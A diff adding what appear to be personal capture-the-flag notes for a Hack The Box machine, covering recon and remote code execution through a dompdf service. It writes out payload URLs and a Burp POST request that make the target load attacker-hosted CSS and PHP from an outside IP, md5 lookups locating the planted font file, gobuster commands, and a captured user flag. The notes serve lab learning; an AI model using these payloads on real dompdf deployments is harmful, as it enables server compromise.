@@ -1,0 +1,59 @@
+contact@interface.htb -> email inside the index source file
+
+maybe using some kinda next.js setup
+
+/_next/ LFI possibly?
+
+nginx output in burpsuite
+
+========================================
+
+After repeating a reload req through burp we get a new domain:
+http://prd.m.rendering-api.interface.htb
+
+We then have to perform multiple gobusters till we eventually find dompdf:
+dompdf is a php service vuln to a RCE attack:
+
+https://github.com/positive-security/dompdf-rce
+
+cmd Base : index.php?pdf&title=<link rel=stylesheet href='http://localhost:9001/exploit.css'>
+
+cmd : http://prd.m.rendering-api.interface.htb/index.php?pdf&title=<link rel=stylesheet href='http://10.10.14.29:9001/exploit.css'>
+
+You have to perform POST Reqs on these directories, concerning things like API which existed, this leads to html2pdf which uses json: "html":"data"
+
+======== burp ==========
+POST /api/html2pdf HTTP/1.1
+Host: prd.m.rendering-api.interface.htb
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Content-Type: application/json
+Connection: close
+Upgrade-Insecure-Requests: 1
+Content-Length: 79
+
+{
+"html":"<link rel=stylesheet href='http://10.10.14.29:9001/exploit.css'>"
+}
+========================
+
+dompdf md5 encrypts the file name:
+echo -n "http://10.10.14.29:9001/exploit_font.php" | md5sum
+e5c8d40b59f933fa0b205c1105e4d859
+
+file location : http://prd.m.rendering-api.interface.htb/vendor/dompdf/dompdf/lib/fonts/exploitfont_normal_e5c8d40b59f933fa0b205c1105e4d859.php
+
+[*] Raft Dictionaries are fairly good at hitting directories on websites
+We can run gobuster to send POST reqs like this:
+	sudo gobuster dir -m "POST" -u "http://prd.m.rendering-api.interface.htb/vendor/dompdf/" -w /usr/share/wordlists/SecLists/Discovery/Web-Content/raft-small-directories.txt -o [outputFile]
+	
+http://prd.m.rendering-api.interface.htb/vendor/dompdf/dompdf/lib/fonts/exploitfont_normal_d64c6e8b2b4f9fadcca4c31a52534f48.php
+
+---------------------------------
+Using git clone https://github.com/positive-security/dompdf-rce.git
+the exploit worked
+
+As www-data you can actually read the user.txt file:
+15cdeaf40b4564188c46f4777a80d70d
